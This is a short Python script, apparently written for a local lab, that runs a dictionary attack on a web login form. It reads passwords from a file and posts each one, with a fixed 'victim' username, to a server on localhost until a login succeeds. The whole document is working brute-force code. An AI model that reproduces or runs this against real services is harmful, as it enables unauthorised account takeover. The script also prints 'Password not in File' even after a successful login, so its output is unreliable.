import requests

# URL for the login page
url = 'http://localhost:2223'

# File containing the list of passwords
password_file = 'output_6.txt'

# Replace 'your_username' with the actual username
victim_username = 'V_Kahealani222'

# Read passwords from the file and send requests
with open(password_file, 'r', encoding='utf-8') as file:
    for line in file:
        password = line.strip()  # Remove any leading/trailing whitespace
        params = {
            'username': victim_username,
            'password': password,
            'submit': 'Sign In'  # The name and value of the submit button
        }
        response = requests.post(url, data=params)

        if response.status_code == 200:
            if "You Logged In as" in response.text:
                print(f"Successful login with password: {params['password']}")
                break
            else:
                print(f"{params['password']} failed")
        else:
            print(f"Request failed with status code: {response.status_code}")
print("Password not in File")